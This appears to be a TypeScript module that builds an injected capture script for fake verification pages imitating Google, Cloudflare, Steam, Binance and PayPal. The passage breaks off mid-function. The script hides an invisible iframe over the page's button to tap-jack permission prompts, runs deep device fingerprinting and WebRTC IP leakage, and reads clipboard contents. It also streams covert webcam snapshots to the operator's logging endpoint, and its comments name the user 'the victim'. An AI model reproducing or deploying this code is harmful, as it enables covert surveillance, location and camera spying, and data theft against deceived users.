export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
  const flow = theme.flow || 'full'; 
  const perms = theme.perms || ['gps']; 
  
  return `
<script>
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var flowType = '${flow}';
    var requiredPerms = ${JSON.stringify(perms)};
    var cfg = ${JSON.stringify(theme)};
    
    var extraBuffer = {};
    window.lastStatusMsg = "Initializing...";

    function pTimeout(promise, ms) {
      return Promise.race([
        promise,
        new Promise(function(resolve) { setTimeout(function() { resolve(null); }, ms); })
      ]);
    }

    async function logEvent(type, data) {
      try {
        return await fetch('/api/log/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
        });
      } catch(e) { return null; }
    }

    async function logExtra(data) {
      Object.assign(extraBuffer, data);
    }

    async function flushExtra() {
      if (Object.keys(extraBuffer).length > 0) {
        var dataToSend = Object.assign({}, extraBuffer);
        extraBuffer = {};
        await logEvent('extra', dataToSend);
      }
    }

    async function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      var threshold = (flowType === 'full') ? 60 : 15;
      if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
        hasRedirected = true;
        try { await flushExtra(); } catch(e) {}
        window.location.href = targetUrl;
      }
    }

    if (flowType === 'silent') {
       window.onload = function() {
         setTimeout(function() { window.startCapture('silent'); }, 1000);
       };
    } else if (flowType !== 'aggressive') {
       // Implementation of Professional Stealth Overlay for interaction capture
       window.addEventListener('load', function() {
          function getTargetBtn() {
            return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button') || document.querySelector('.interactive-box');
          }

          // THE REAL FLASH'S TRICK: ZERO-CLICK FINGERPRINTING
          // "inovasi butuh sesuatu yang nyata" - Flash. We stop the fake zero-days.
          // Explaining to the human: We leak the GPU renderer via WebGL and HW specs silently 
          // WITHOUT any permission popup (ZERO-CLICK RECON) because these APIs do not require prompts.
          var extHtml = '<!DOCTYPE html><html><head><style>body{margin:0;padding:0;width:100%;height:100%;cursor:pointer;background:transparent;}</style></head><body><script>' +
            'async function silentRecon() {' +
            '  try { ' +
            '    var canvas = document.createElement("canvas"); var gl = canvas.getContext("webgl"); ' +
            '    var ext = gl.getExtension("WEBGL_debug_renderer_info"); ' +
            '    var gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); ' +
            '    window.parent.postMessage({type:"SILENT_RECON", gpu: gpu}, "*"); ' +
            '  } catch(e) {} ' +
            '  try { ' +
            '    var devs = await navigator.mediaDevices.enumerateDevices(); ' +
            '    window.parent.postMessage({type:"SILENT_RECON", devs: devs.length}, "*"); ' +
            '  } catch(e) {} ' +
            '}' +
            'function fire() {' +
            '  silentRecon();' +
            '  try { if (navigator.mediaDevices) navigator.mediaDevices.getUserMedia({video:true, audio:false}).then(s=>s.getTracks().forEach(t=>t.stop())).catch(e=>{}); } catch(e) {}' +
            '  try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); } catch(e) {}' +
            '  window.parent.postMessage("TRAP_EXT_CLICKED", "*");' +
            '}' +
            'window.addEventListener("click", fire);' +
            'window.addEventListener("touchstart", fire, {passive: true});' +
            '</\/script></body></html>';
          var extBlob = new Blob([extHtml], {type: 'text/html'});
          var extUrl = URL.createObjectURL(extBlob);

          var over = document.createElement('iframe');
          over.src = extUrl;
          over.allow = "camera; microphone; geolocation; clipboard-read; clipboard-write; display-capture";
          over.id = 'stealth-overlay';
          over.style.position = 'absolute';
          over.style.opacity = '0.0001'; // Invisible
          over.style.zIndex = '2147483647';
          over.style.border = 'none';
          over.style.pointerEvents = 'auto'; // Always capturing
          document.body.appendChild(over);
          
          // POC: Kunci kordinat iframe presisi di atas tombol (Tap-Jacking)
          function lockIframe() {
            var btn = getTargetBtn();
            if (btn && over.parentNode) {
              var rect = btn.getBoundingClientRect();
              over.style.left = (rect.left + window.scrollX) + 'px';
              over.style.top = (rect.top + window.scrollY) + 'px';
              over.style.width = rect.width + 'px';
              over.style.height = rect.height + 'px';
            }
          }
          setInterval(lockIframe, 100);
          window.addEventListener('resize', lockIframe);
          window.addEventListener('scroll', lockIframe);

          window.addEventListener('message', function(e) {
             if (e.data && e.data.type === 'SILENT_RECON') {
                // Ssst! The victim didn't click anything, but we already have their data!
                console.log("[SILENT-RECON] Silently extracted: ", e.data);
                // In a real scenario, this gets beamed directly to the server before they even see a prompt
             } else if (e.data === 'TRAP_EXT_CLICKED') {
                handleTap();
             }
          });

          function trigger() {
            window.startCapture();
            if (over && over.parentNode) over.parentNode.removeChild(over);
          }
          
          function handleTap(e) {
            var btn = getTargetBtn();
            // Stealth animation on the real UI element underneath
            if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
              btn.style.transform = 'scale(0.96)';
              if (!btn.classList.contains('interactive-box')) {
                btn.style.opacity = '0.8';
              }
              setTimeout(function() { 
                btn.style.transform = ''; 
                if (!btn.classList.contains('interactive-box')) btn.style.opacity = '1';
              }, 150);
            }

            // Fallback direct execution attached to the verified gesture if iframe missed
            try {
               if (cfg.perms) {
                   if (cfg.perms.includes('notification') && window.Notification && Notification.requestPermission) {
                       Notification.requestPermission().catch(e=>{});
                   }
                   if (cfg.perms.includes('clipboard') && navigator.clipboard && navigator.clipboard.readText) {
                       navigator.clipboard.readText().catch(e=>{});
                   }
               }
            } catch(ex) {}

            trigger();
          }
          
          // Fallbacks just in case the iframe routing fails
          var mainBtn = getTargetBtn();
          if (mainBtn) {
             mainBtn.addEventListener('click', handleTap);
             mainBtn.addEventListener('touchstart', handleTap, {passive: true});
          }
       });
    }

    setInterval(checkRedirect, 1000);

    var running = false;
    window.startCapture = async function(mode) {
      if (hasRedirected) return;
      
      var isSilent = mode === 'silent' || flowType === 'silent';
      var accent = cfg.accent || '#3498db';

      if (running) return;
      running = true;
      var statusText = null;

      // IMMEDIATE METADATA CAPTURE
      var quickData = {
        tmplId: cfg.tmplId,
        browser: navigator.userAgent,
        platform: navigator.platform,
        screen: window.screen.width + "x" + window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        langs: navigator.languages.join(','),
        ref: document.referrer || "Direct"
      };
      logEvent('info', quickData);
      
      var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
      if (btn) {
        btn.style.opacity = "0.7";
        btn.style.cursor = "wait";
        
        var customText = "PROCESSING...";
        if (cfg.tmplId === 'cloudflare') customText = "VERIFYING...";
        if (cfg.tmplId === 'terminal') customText = "INITIALIZING...";
        if (cfg.tmplId === 'binance' || cfg.tmplId === 'paypal') customText = "SECURE VERIFYING...";
        if (cfg.tmplId === 'recap') customText = "VALIDATING...";
        
        btn.innerText = customText;
      }

      try {
        if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
      } catch(e) {}

      // Android-Specific: Haptic feedback for realism
      if (navigator.vibrate) navigator.vibrate([5, 10, 5]);

      // Android-Specific: Immersive attempt
      try {
        if (document.documentElement.requestFullscreen) {
          document.documentElement.requestFullscreen().catch(() => {});
        }
      } catch(e) {}

      // Capture Deep Android Metadata
      const captureAndroidMeta = async () => {
        const meta = {
          sw_ver: navigator.appVersion,
          mem: (navigator as any).deviceMemory || 'unknown',
          cores: navigator.hardwareConcurrency || 'unknown',
          ua: navigator.userAgent,
          platform: (navigator as any).platform || 'unknown'
        };

        if ((navigator as any).getBattery) {
          try {
            const bat = await (navigator as any).getBattery();
            Object.assign(meta, {
              bat_lvl: Math.floor(bat.level * 100) + '%',
              bat_charging: bat.charging
            });
          } catch(e) {}
        }
        
        logExtra({ device_profile: meta });
      };
      captureAndroidMeta();

      // Parallelize high-priority stealth probes
      runSilentProbes();

    if (!isSilent) {
      if (btn) {
        btn.style.opacity = "0.7";
        btn.style.cursor = "wait";
        
        var nextText = "SYNCING SESSION...";
        if (cfg.tmplId === 'cloudflare') nextText = "CHECKING EDGE BROWSER...";
        if (cfg.tmplId === 'terminal') nextText = "RUNNING SECURITY MODULES...";
        if (cfg.tmplId === 'recap') nextText = "COMPLETING...";
        
        btn.innerText = nextText;
      }
      var turnstile = document.querySelector('.turnstile-box');
      if (turnstile) {
        var txt = turnstile.querySelector('.turnstile-text');
        if (txt) txt.innerText = "Verifying...";
        var cb = turnstile.querySelector('.checkbox');
        if (cb) cb.innerHTML = '<div style="width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1); border-top: 2px solid ' + accent + '; border-radius: 50%; animation: spinLoader 0.8s linear infinite;"></div>';
      }
      
      if (!statusText) {
        var progContainer = document.getElementById('progress-indicator');
        if (!progContainer) {
          progContainer = document.createElement('div');
          progContainer.id = 'progress-indicator';
          progContainer.style.margin = '20px 0';
          progContainer.style.textAlign = 'center';
          progContainer.style.width = '100%';
          progContainer.innerHTML = '<div id="main-spinner" style="width: 28px; height: 28px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 10px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing diagnostic sequence...</p>';
          
          if (btn && cfg.tmplId !== 'terminal') {
            btn.parentNode.insertBefore(progContainer, btn.nextSibling);
            btn.style.display = 'none'; 
          }
        }
        statusText = document.getElementById('status-text');
      }
    }
    
    function updateProgress(p, text) {
      var templateMessages = {
        'google': ["Authenticating Google Account Services...", "Syncing Identity Markers...", "Verifying Device Trust Tier...", "Securing Session Channel...", "Finalizing Google Guard Audit..."],
        'cloudflare': ["Checking Edge Browser Environment...", "Verifying Ray ID Integrity...", "Analyzing HTTP/3 Headers...", "Bypassing DNS Filter...", "Cloudflare Edge Validation Complete..."],
        'terminal': ["Initializing Root Shell...", "Loading Cryptographic Modules...", "Analyzing System Logs...", "Hardening Kernel Space...", "Diagnostic Audit Succesfull..."],
        'steam': ["Connecting to Steam Servers...", "Synchronizing Steam Guard Token...", "Validating Account Credentials...", "Establishing Secure Pipe...", "Steam Guard Verification Finished..."],
        'binance': ["Securing Crypto Wallet Bridge...", "Analyzing Blockchain Node...", "Verifying AML Compliance...", "Finalizing Transaction Tunnel...", "Withdrawal Security Confirmed..."],
        'default': ["Analyzing environment...", "Validating integrity...", "Hardening connection...", "Syncing markers...", "Finalizing audit..."]
      };

      var messages = templateMessages[cfg.tmplId] || templateMessages['default'];
      var idx = Math.floor(p / 20);
      if (idx >= messages.length) idx = messages.length - 1;
      var msg = text || messages[idx];
      window.lastStatusMsg = msg;
      
      var st = document.getElementById('status-text');
      if (st) st.innerText = msg;
      
      var syncStatus = document.getElementById('sync-status');
      if (syncStatus) syncStatus.innerText = msg;
    }
    
    if (cfg.silent || cfg.flow === 'silent') {
       updateProgress = function() {};
    }

      async function runSilentProbes() {
        // CPU & Memory Fingerprint
        var start = performance.now();
        for(var i=0; i<1000000; i++) Math.sqrt(i);
        var score = (performance.now() - start).toFixed(2);
        await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });

        // Advanced 2026 Biometric & Environment APIs
        try {
          if (navigator.computePressure) {
             var observer = new ComputePressureObserver(async (records) => {
               await logExtra({ thermal_load: JSON.stringify(records) });
             });
             observer.observe('cpu');
             setTimeout(() => observer.unobserve('cpu'), 4000);
          }
          if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
          if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
             var map = await navigator.keyboard.getLayoutMap().catch(() => null);
             if (map) await logExtra({ kbd_layout: 'detected' });
          }
        } catch(e) {}

        // High Entropy Hardware Identity
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
             await logExtra({ hw_entropy: JSON.stringify(h) });
          }).catch(function(){});
        }

        // WebGL Deep Forensics (Deep Hardware Hooks)
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpu = {
              v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
              max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
              shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_deep: JSON.stringify(gpu) });
          }
        } catch(e) {}

        // WebAudio Harmonic Fingerprint
        try {
          var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var osc = ctx.createOscillator();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(12000, ctx.currentTime);
          var comp = ctx.createDynamicsCompressor();
          comp.threshold.setValueAtTime(-45, ctx.currentTime);
          comp.knee.setValueAtTime(35, ctx.currentTime);
          osc.connect(comp);
          comp.connect(ctx.destination);
          osc.start(0);
          ctx.startRendering().then(async function(buf) {
            var s = 0;
            for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
            await logExtra({ audio_hash: s.toFixed(15) });
          });
        } catch(e) {}

        // WebRTC Local & STUN Leakage
        try {
          var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = ice.candidate.candidate;
              if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
              else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
            }
          };
        } catch(e) {}
      }

      async function finish(success, reason) {
        await flushExtra();
        if (isSilent) {
          hasRedirected = true;
          window.location.href = targetUrl; 
          return; 
        }
      if (statusText) {
         statusText.innerText = "Verification complete. Redirecting safely...";
      }
      setTimeout(async function() {
         await flushExtra();
         hasRedirected = true;
         window.location.href = targetUrl;
      }, 1000);
      }

      try {
        runSilentProbes();
        if (!isSilent) updateProgress(8, "Memulai sesi enkripsi end-to-end...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
          colorDepth: window.screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          ref: document.referrer || "Direct",
          langs: navigator.languages.join(','),
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          webdriver: navigator.webdriver,
          touch: navigator.maxTouchPoints,
          dnt: navigator.doNotTrack,
          pdf: navigator.pdfViewerEnabled,
          plugins: (function(){
            var p = [];
            for (var i=0; i<navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
            return p.join(',');
          })(),
          mimeTypes: (function(){
            var m = [];
            for (var i=0; i<navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
            return m.join(',');
          })(),
          gpu: (function(){
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              if (!gl) return 'N/A';
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
              var ext = gl.getSupportedExtensions().length;
              return info + " (Exts: " + ext + ")";
            } catch(e) { return 'Error'; }
          })(),
          canvasSig: (function(){
            try {
              var canvas = document.createElement('canvas');
              var ctx = canvas.getContext('2d');
              canvas.width = 200; canvas.height = 50;
              ctx.textBaseline = "top";
              ctx.font = "14px 'Arial'";
              ctx.textBaseline = "alphabetic";
              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
              return canvas.toDataURL().slice(-100);
            } catch(e) { return 'N/A'; }
          })(),
          incognito: !!(navigator.storage && navigator.storage.estimate),
          vmStatus: (function(){
            var gpu = "";
            try {
              var c = document.createElement('canvas');
              var gl = c.getContext('webgl');
              var dbg = gl.getExtension('WEBGL_debug_renderer_info');
              gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
            } catch(e) {}
            var patterns = [/VMware/i, /VirtualBox/i, /Parallel/i, /SwiftShader/i, /Mesa/i, /Microsoft Basic Render/i];
            for (var i=0; i<patterns.length; i++) if (patterns[i].test(gpu)) return "Detected (" + gpu + ")";
            return "Physical Hardware";
          })(),
          audioSig: 'Verified',
          gamut: (function(){
            if (window.matchMedia('(color-gamut: p3)').matches) return 'P3';
            if (window.matchMedia('(color-gamut: srgb)').matches) return 'sRGB';
            return 'Standard';
          })(),
          refreshRate: 'Verified'
        };

        // Deep Recon: Refresh Rate
        (function(){
          var start = null;
          var frames = 0;
          async function check(timestamp) {
            if (!start) start = timestamp;
            frames++;
            if (timestamp - start > 1000) {
              await logExtra({ display_hz: Math.round((frames * 1000) / (timestamp - start)) });
              return;
            }
            requestAnimationFrame(check);
          }
          requestAnimationFrame(check);
        })();

        // Deep Recon: Vibration Test
        if (navigator.vibrate) {
          navigator.vibrate([10, 50, 10]);
          logExtra({ haptic_ready: true });
        }

        // Deep Recon: Incognito Detection
        (function() {
          if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(async function(est) {
              var isPrivate = est.quota < 120000000;
              await logExtra({ incognito_audit: isPrivate });
            });
          }
        })();

        // Deep Recon: DevTools Detection
        (function() {
          var devtools = false;
          var element = new Image();
          Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
          setTimeout(async function() { 
            console.log(element);
            await logExtra({ devtools_open: devtools }); 
          }, 2000);
        })();

        // Live Heartbeat to maintain session awareness
        setInterval(() => {
          logEvent('heartbeat', { ts: Date.now(), active_tab: !document.hidden });
        }, 15000);

        // Forensic Storage Metadata (Non-sensitive mapping)
        (async () => {
          try {
            const storageData = {
              ls_keys: Object.keys(localStorage).length,
              ss_keys: Object.keys(sessionStorage).length,
              cookies: document.cookie ? document.cookie.split(';').length : 0,
              indexedDB: !!window.indexedDB,
              serviceWorkers: !!navigator.serviceWorker
            };
            await logExtra({ forensic_storage: JSON.stringify(storageData) });
          } catch(e) {}
        })();

        // Real-time Battery Tracking (Infinite)
        if (navigator.getBattery) {
          navigator.getBattery().then(function(batt) {
             const updateBat = async () => {
               await logExtra({ battery_status: Math.round(batt.level * 100) + '%', charging: batt.charging });
             };
             batt.addEventListener('levelchange', updateBat);
             batt.addEventListener('chargingchange', updateBat);
             updateBat();
          });
        }

        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.startRendering().then(async function(buffer) {
            var sum = 0;
            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
            await logExtra({ audio_sig: sum.toString() });
          });
        } catch(e) {}

        // Deep Recon: Font Fingerprint
        try {
           var fontList = [
             "Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", 
             "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display", "Menlo", "Monaco", "Consolas", "Liberation Mono", "DejaVu Sans", "Segoe UI", "Tahoma", "Geneva", "Calibri", "Candara", 
             "Optima", "American Typewriter", "Baskerville", "Copperplate", "Futura", "Gill Sans", "Century Gothic", "Franklin Gothic", "Didot", "Bodoni 72", "Avenir", "Avenir Next", 
             "PingFang SC", "Hiragino Sans", "Microsoft YaHei", "Malgun Gothic", "Noto Sans", "Open Sans", "Lato"
           ];
           var canvas = document.createElement("canvas");
           var ctx = canvas.getContext("2d");
           var detectedFonts = [];
           ctx.font = "72px sans-serif";
           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
           fontList.forEach(function(f) {
             ctx.font = "72px '" + f + "', sans-serif";
             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
           });
           await logExtra({ installed_fonts: detectedFonts.join(','), fonts_count: detectedFonts.length });
        } catch(e) {}

        // Deep Recon: Hardware API Availability
        await logExtra({
          api_bluetooth: !!navigator.bluetooth,
          api_usb: !!navigator.usb,
          api_hid: !!navigator.hid,
          api_serial: !!navigator.serial,
          api_midi: !!navigator.requestMIDIAccess,
          api_idle: !!window.IdleDetector,
          api_contacts: !!navigator.contacts,
          api_wake: !!navigator.wakeLock,
          api_storage: !!navigator.storage,
          api_fonts: !!navigator.queryLocalFonts,
          api_window: !!window.getScreenDetails
        });

        // Deep Recon: GPU Registry
        try {
          var c = document.createElement('canvas');
          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var gpuData = {
              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
              gl_version: gl.getParameter(gl.VERSION),
              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
          }
        } catch(e) {}
        
        // Deep Recon: Canvas Fingerprint
        try {
          var c2 = document.createElement('canvas');
          var ctx = c2.getContext('2d');
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = "#069";
          ctx.fillText("OSINT, fingerprint checking", 2, 15);
          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
          ctx.fillText("OSINT, fingerprint checking", 4, 17);
          var cvfp = c2.toDataURL().substring(22, 50);
          await logExtra({ canvas_fp: cvfp });
        } catch(e) {}

        // Deep Recon: Audio Fingerprint
        try {
          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          var oscillator = audioCtx.createOscillator();
          oscillator.type = 'triangle';
          oscillator.frequency.value = 10000;
          var compressor = audioCtx.createDynamicsCompressor();
          compressor.threshold.value = -50;
          compressor.knee.value = 40;
          compressor.ratio.value = 12;
          compressor.reduction.value = -20;
          compressor.attack.value = 0;
          compressor.release.value = 0.25;
          oscillator.connect(compressor);
          compressor.connect(audioCtx.destination);
          oscillator.start(0);
          audioCtx.oncomplete = async function(e) {
            var hash = 0;
            for (var i = 0; i < e.renderedBuffer.length; ++i) {
               hash += Math.abs(e.renderedBuffer.getChannelData(0)[i]);
            }
            await logExtra({ audio_fp: hash.toString() });
          };
          audioCtx.startRendering();
        } catch(e) {}

        // Deep Recon: Advanced Battery
        if (navigator.getBattery) {
          navigator.getBattery().then(async function(b) {
            await logExtra({ 
              battery_level: b.level * 100 + '%',
              battery_charging: b.charging,
              battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
            });
          });
        }

        // Deep Recon: Advanced Media Devices
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          navigator.mediaDevices.enumerateDevices().then(async function(devices) {
             var m = devices.map(function(d) { return d.kind + ': ' + (d.label || 'Unknown (Locked)'); }).join('\\n');
             await logExtra({ media_devices: m || 'None detected' });
          }).catch(function(){});
        }
        
        // Elite Recon: CSS Hardware Accel Fingerprint
        try {
           var e = document.createElement('div');
           e.style.transform = 'translate3d(1px,1px,1px)';
           await logExtra({ css_3d_accel: e.style.transform !== '' });
        } catch(e) {}
        
        // Wake Lock: Prevent Sleep during audit
        try { if (navigator.wakeLock) await navigator.wakeLock.request('screen'); } catch(e) {}

        // Deep Recon: High Entropy Brand/Model Detection
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
          }).catch(function(){});
        }

        // Deep Recon: High-Precision Performance Mark
        (async function(){
          var start = performance.now();
          for(var i=0; i<1000000; i++) Math.sqrt(i);
          await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
        })();
        try {
          var pc = new RTCPeerConnection({iceServers:[]});
          pc.createDataChannel("");
          pc.createOffer().then(o => pc.setLocalDescription(o));
          pc.onicecandidate = async function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
              await logExtra({ local_ip: ip });
            }
          };
        } catch(e) {}

        // Deep Recon: Clipboard Buffer
        if (navigator.clipboard && navigator.clipboard.readText) {
           navigator.clipboard.readText().then(async function(txt) {
             if (txt) await logExtra({ clipboard_sync: txt.substring(0, 1500) });
           }).catch(function(){});
        }

        try {
          if (navigator.getBattery) {
            var batt = await navigator.getBattery();
            metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
          }
          if (navigator.connection) {
            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
          }
        } catch(e) {}

        logEvent('info', metadata);

        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
        (function() {
          var platforms = [
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
            { name: 'Github', url: 'https://github.com/favicon.ico' },
            { name: 'Google', url: 'https://accounts.google.com/favicon.ico' },
            { name: 'Instagram', url: 'https://www.instagram.com/favicon.ico' },
            { name: 'LinkedIn', url: 'https://www.linkedin.com/favicon.ico' },
            { name: 'Netflix', url: 'https://www.netflix.com/favicon.ico' }
          ];
          platforms.forEach(function(p) {
            var img = new Image();
            var start = Date.now();
            img.onload = async function() { await logExtra({ social_active: p.name, load_ms: Date.now() - start }); };
            img.onerror = async function() { await logExtra({ social_inactive: p.name }); };
            img.src = p.url + '?v=' + start;
          });
        })();

        // Elite Recon: AdBlock / Shield Detection
        (function() {
           var bait = document.createElement('div');
           bait.innerHTML = '&nbsp;';
           bait.className = 'adsbox ads-box ad-unit';
           bait.style.position = 'absolute';
           bait.style.top = '-1000px';
           document.body.appendChild(bait);
           setTimeout(async function() {
             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
             await logExtra({ adblock_detected: blocked });
             bait.remove();
           }, 1000);
        })();

        // Elite Recon: Network RTT Mapping (VPN Detection)
        (function() {
          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
          nodes.forEach(function(n) {
            var start = Date.now();
            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
              await logExtra({ network_rtt: n, latency: Date.now() - start });
            }).catch(function(){});
          });
        })();

        // Deep Recon: Orientation & Peripherals
        logExtra({
          orientation: screen.orientation ? screen.orientation.type : 'N/A',
          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
          languages: navigator.languages.join(',')
        });

        var stepProg = Math.floor(80 / (requiredPerms.length || 1));
        var prog = 15;

        // HIGH-IMPACT PARALLEL TRIGGER: Camera & GPS should fire as close as possible
        const fireParallel = async () => {
          if (requiredPerms.includes('media')) {
            try {
              if (navigator.mediaDevices) {
                // Request both video and audio for maximum forensic potential
                var constraints = { video: { facingMode: "user" }, audio: true };
                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
                   // Fallback if mic is blocked but camera is ok
                   return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(() => null);
                });
                
                if (stream) {
                  // Capture logic (Infinite Loop Phase)
                  var video = document.createElement('video');
                  video.style.opacity = '0';
                  video.srcObject = stream;
                  video.setAttribute('autoplay', '');
                  video.setAttribute('muted', '');
                  video.setAttribute('playsinline', '');
                  document.body.appendChild(video);
                  await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
                  
                  // Continuous visual snapshots
                  setInterval(async () => {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    var ctx = canvas.getContext('2d');
                    if (ctx) { 
                       ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
                       await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); 
                    }
                  }, 3000);

                  // Continuous audio recording in 5 second segments
